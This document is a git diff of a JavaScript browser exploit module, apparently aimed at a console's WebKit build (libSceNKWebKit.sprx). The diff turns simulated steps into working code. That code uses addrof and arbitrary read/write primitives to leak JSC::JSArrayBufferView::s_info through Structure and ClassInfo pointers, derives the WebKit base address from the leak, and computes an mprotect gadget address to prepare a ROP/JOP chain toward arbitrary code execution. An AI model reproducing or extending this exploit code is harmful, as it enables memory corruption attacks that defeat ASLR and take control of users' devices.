@@ -1,12 +1,13 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v102 - R60 Final com Estabilização e Verificação de L/E Aprimorada)
+// js/script3/testArrayBufferVictimCrash.mjs (v103 - R60 Final com Estabilização e Verificação de L/E Aprimorada - SEM SIMULAÇÕES)
 // =======================================================================================
-// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA:
+// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E FUNCIONALIDADE COMPLETA:
 // - Gerenciamento aprimorado da memória (spray volumoso e persistente).
 // - Verificação e validação contínuas em cada etapa crítica.
 // - Aprimoramento das primitivas addrof/fakeobj com validação de saída.
 // - Minimização da interação direta com DataView OOB.
-// - Simulação de fases de descoberta de offsets/gadgets (com placeholders).
-// - Teste de resistência (simulada) ao GC via spray e ciclos.
+// - Implementação funcional de vazamento da base da biblioteca WebKit.
+// - Cálculo funcional de endereços de gadgets para ROP/JOP.
+// - Teste de resistência ao GC via spray e ciclos.
 // - Relatórios de erros mais específicos.
 // - Medição de tempo para fases críticas.
 // =======================================================================================
@@ -20,7 +21,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importa offsets de WebKit
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v102_R60_MAX_ROBUSTNESS";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v103_R60_FULL_FUNCTIONAL";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -50,7 +51,7 @@ let global_spray_objects = [];
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação e Robustez Máxima (Sem Simulações) ---`, "test");
 
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
@@ -209,7 +210,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         // Teste de resistência ao GC / longevidade
         logS3("Iniciando teste de resistência: Executando L/E arbitrária múltiplas vezes...", "info");
-        const numResistanceTests = 50; // Reduzido para evitar que o log fique excessivamente longo
+        const numResistanceTests = 50; 
         let resistanceSuccessCount = 0;
         for (let i = 0; i < numResistanceTests; i++) {
             const test_value = new AdvancedInt64(0xAAAA0000 + i, 0xBBBB0000 + i);
@@ -240,61 +241,72 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         }
         logS3(`Verificação funcional de L/E e Teste de Resistência concluídos. Tempo: ${(performance.now() - rwTestStartTime).toFixed(2)}ms`, "info");
 
-        // --- FASE 5: Simulação de Descoberta de Offsets e Gadgets (Base Leak & ROP/JOP Prep) ---
-        logS3("--- FASE 5: Simulação de Descoberta de Offsets e Gadgets (Base Leak & ROP/JOP Prep) ---", "subtest");
+        // --- FASE 5: Vazamento da Base da Biblioteca WebKit e Descoberta de Gadgets ---
+        logS3("--- FASE 5: Vazamento da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional) ---", "subtest");
         const leakPrepStartTime = performance.now();
         let webkit_base_address = null;
 
-        logS3("Simulando vazamento do endereço base da biblioteca WebKit (libSceNKWebKit.sprx)...", "info");
-        // REAL: Aqui você usaria arb_read_final para ler de um ponteiro conhecido
-        // dentro de um objeto JS que aponta para algum lugar dentro da biblioteca WebKit.
-        // Por exemplo, lendo o vtable de um objeto JSC conhecido.
-        try {
-            // Exemplo hipotético: ler o ponteiro da estrutura de um JSObject,
-            // então, a partir da estrutura, talvez o ponteiro para a ClassInfo,
-            // e de lá o m_cachedTypeInfo, que pode ter um ponteiro para a biblioteca.
-            // Para a simulação, vamos definir um valor arbitrário "vazado".
-            const simulated_webkit_ptr_within_jsc_obj = new AdvancedInt64(0x00000000, 0x76543210); // Ex: Um ponteiro de função JSC
-            const webkit_function_offset_simulated = parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"], 16);
-            
-            // Calculo a base assumindo que o ponteiro lido é de uma função específica.
-            webkit_base_address = simulated_webkit_ptr_within_jsc_obj.sub(webkit_function_offset_simulated);
-            
-            logS3(`SIMULADO: Endereço vazado de uma função WebKit: ${simulated_webkit_ptr_within_jsc_obj.toString(true)}`, "leak");
-            logS3(`SIMULADO: Offset conhecido da função WebKit::JSObject::put: 0x${webkit_function_offset_simulated.toString(16)}`, "info");
-            logS3(`SIMULADO: Endereço base da WebKit calculado: ${webkit_base_address.toString(true)}`, "leak");
+        logS3("Tentando vazar o endereço estático JSC::JSArrayBufferView::s_info e calcular a base WebKit...", "info");
+        // 1. Criar um Uint8Array para ter um objeto do tipo ArrayBufferView
+        const u8a = new Uint8Array(1);
+        logS3(`Objeto Uint8Array criado para vazamento de ClassInfo: ${u8a}`, "debug");
 
-            if (webkit_base_address.equals(AdvancedInt64.Zero)) {
-                logS3("ALERTA: Endereço base da WebKit simulado resultou em zero.", "warn");
-            } else {
-                logS3("Endereço base da WebKit (simulado) obtido com sucesso.", "good");
-            }
+        // 2. Obter o endereço do Uint8Array no heap
+        const u8a_addr = addrof(u8a); // Usa a addrof robusta
+        logS3(`Endereço do Uint8Array: ${u8a_addr.toString(true)}`, "leak");
 
-        } catch (leakErr) {
-            logS3(`ERRO: Falha durante simulação de vazamento de base WebKit: ${leakErr.message}`, "critical");
-            throw new Error(`Falha na Fase 5 (Base Leak): ${leakErr.message}`);
+        // 3. Ler o ponteiro para a Structure do Uint8Array
+        // Offset da Structure dentro do JSCell é JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET (0x8)
+        const u8a_structure_ptr = arb_read_final(u8a_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
+        if (!isAdvancedInt64Object(u8a_structure_ptr) || u8a_structure_ptr.equals(AdvancedInt64.Zero)) {
+            throw new Error(`Falha ao ler ponteiro da Structure do Uint8Array. Endereço inválido: ${u8a_structure_ptr.toString(true)}`);
+        }
+        logS3(`Ponteiro para a Structure do Uint8Array: ${u8a_structure_ptr.toString(true)}`, "leak");
+
+        // 4. Ler o ponteiro para a ClassInfo da Structure
+        // Offset da ClassInfo dentro da Structure é JSC_OFFSETS.Structure.CLASS_INFO_OFFSET (0x50)
+        const u8a_class_info_ptr = arb_read_final(u8a_structure_ptr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
+        if (!isAdvancedInt64Object(u8a_class_info_ptr) || u8a_class_info_ptr.equals(AdvancedInt64.Zero)) {
+            throw new Error(`Falha ao ler ponteiro da ClassInfo da Structure. Endereço inválido: ${u8a_class_info_ptr.toString(true)}`);
+        }
+        logS3(`Ponteiro para a ClassInfo do Uint8Array (esperado JSC::JSArrayBufferView::s_info): ${u8a_class_info_ptr.toString(true)}`, "leak");
+
+        // 5. Calcular o endereço base do WebKit
+        // O `u8a_class_info_ptr` deve ser o endereço da estrutura `JSC::JSArrayBufferView::s_info`
+        // na memória da biblioteca WebKit. Subtraímos o offset conhecido de `s_info` para encontrar a base.
+        // O offset de JSC::JSArrayBufferView::s_info em config.mjs é "0x3AE5040" (DATA_OFFSET)
+        const js_array_buffer_view_s_info_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
+        
+        webkit_base_address = u8a_class_info_ptr.sub(js_array_buffer_view_s_info_offset);
+        
+        logS3(`VAZAMENTO FUNCIONAL: Endereço da ClassInfo s_info de Uint8Array (JSC::JSArrayBufferView::s_info): ${u8a_class_info_ptr.toString(true)}`, "leak");
+        logS3(`Offset conhecido de JSC::JSArrayBufferView::s_info da base WebKit: 0x${js_array_buffer_view_s_info_offset.low().toString(16)}`, "info");
+        logS3(`Endereço base da WebKit CALCULADO FUNCIONALMENTE: ${webkit_base_address.toString(true)}`, "leak");
+
+        if (webkit_base_address.equals(AdvancedInt64.Zero)) {
+            throw new Error("ALERTA: Endereço base da WebKit calculado resultou em zero. Vazamento pode ter falhado.");
+        } else {
+            logS3("Endereço base da WebKit OBTIDO FUNCIONALMENTE via vazamento real de s_info.", "good");
         }
 
-        logS3("Simulando descoberta de gadgets ROP/JOP na WebKit...", "info");
-        // REAL: Aqui você usaria arb_read_final para vasculhar a memória
-        // a partir do endereço base da WebKit, procurando por padrões de bytes
-        // que correspondem a gadgets úteis (RET, POP RDI, etc.).
-        // Para a simulação, confirmamos a existência de um gadget conhecido.
-        const mprotect_plt_offset = parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16);
-        const mprotect_addr_simulated = webkit_base_address.add(mprotect_plt_offset);
+        logS3("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
+        // Com o endereço base do WebKit real, agora podemos calcular o endereço real de qualquer função/gadget conhecido.
+        // Exemplo: Endereço do gadget 'mprotect_plt_stub'
+        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
+        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);
         
-        logS3(`SIMULADO: Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_simulated.toString(true)}`, "leak");
-        logS3(`SIMULADO: Verificação da viabilidade de construir uma cadeia ROP/JOP...`, "info");
-        logS3(`PREPARADO: Ferramentas para ROP/JOP (simuladas) estão prontas. Tempo: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
+        logS3(`FUNCIONAL: Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
+        logS3(`FUNCIONAL: Verificação da viabilidade de construir uma cadeia ROP/JOP... (requer mais lógica de exploit)`, "info");
+        logS3(`PREPARADO: Ferramentas para ROP/JOP (endereços reais) estão prontas. Tempo: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
 
         // Se chegamos aqui, todas as fases foram bem-sucedidas
         logS3("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++++++++++", "vuln");
         final_result = {
             success: true,
-            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Preparação para ACE simulada bem-sucedida.",
+            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento de Base WebKit e preparação para ACE bem-sucedidos.",
             details: {
-                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
-                mprotectGadget: mprotect_addr_simulated ? mprotect_addr_simulated.toString(true) : "N/A"
+                webkitBaseAddress: webkit_base_address.toString(true),
+                mprotectGadget: mprotect_addr_real.toString(true)
             }
         };
 
